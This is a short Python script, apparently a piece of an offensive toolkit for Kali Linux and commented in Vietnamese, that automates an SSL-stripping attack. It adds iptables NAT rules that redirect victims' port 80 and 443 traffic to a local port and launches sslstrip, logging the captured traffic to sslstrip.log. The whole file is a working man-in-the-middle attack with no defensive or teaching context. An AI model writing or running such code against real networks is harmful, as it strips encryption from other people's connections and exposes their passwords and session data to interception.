import os
import subprocess

class SSLBypass:
    def __init__(self, listen_port="10000"):
        self.port = listen_port

    def start(self):
        print(f"[*] Activating SSLStrip+ on port {self.port}...")
        # Cấu hình IPtables để chặn và chuyển hướng traffic HTTPS (443) về SSLStrip
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {self.port}")
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {self.port}")
        
        # Khởi chạy sslstrip (Yêu cầu cài đặt sslstrip trên Kali)
        try:
            subprocess.Popen(["sslstrip", "-l", self.port, "-a", "-w", "sslstrip.log"])
            print("[+] Protocol Downgrade Engine: RUNNING")
        except FileNotFoundError:
            print("[!] Error: sslstrip not found. Install with: sudo apt install sslstrip")

    def stop(self):
        os.system("iptables -t nat --flush")
        print("[+] SSL Bypass Disengaged.")

if __name__ == "__main__":
    bypass = SSLBypass()
    bypass.start()